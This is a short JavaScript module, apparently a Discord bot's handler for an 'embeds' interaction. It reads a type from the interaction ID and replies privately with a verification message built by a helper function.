const getbotnumber = require("../../../db/getbotnumber");
const verificationMessage = require("../../utils/responses/verificationMessage");

let disableautosecure = {
    name: "embeds",
    editembeds: true,
    callback: async (client, interaction) => {
        let botnumber = await getbotnumber(interaction, client, 2, "embeds|");
        await interaction.deferReply({ ephemeral: true }); 

        let type = interaction.customId?.split("|")[1]; 

        if (!type) {
            return interaction.editReply("Invalid interaction type.");
        }

        let response = await verificationMessage(client, client.username, type, botnumber);
        return interaction.editReply(response); 
    }
};

module.exports = disableautosecure;
